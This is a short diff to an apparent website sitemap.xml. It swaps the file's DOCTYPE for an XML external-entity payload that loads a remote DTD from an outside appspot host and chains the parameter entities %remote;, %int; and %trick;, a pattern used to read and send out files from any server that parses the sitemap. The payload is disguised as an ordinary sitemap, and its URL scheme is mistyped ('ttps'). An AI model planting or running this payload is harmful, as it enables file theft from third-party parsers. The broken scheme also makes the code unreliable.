@@ -1,6 +1,10 @@
 ---
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE urlset PUBLIC "-//VSR//PENTEST//EN" "https://antoniosanso.appspot.com/lol">
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "ttps://antoniosanso.appspot.com/lol">
+%remote;
+%int;
+%trick;]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
 </urlset>
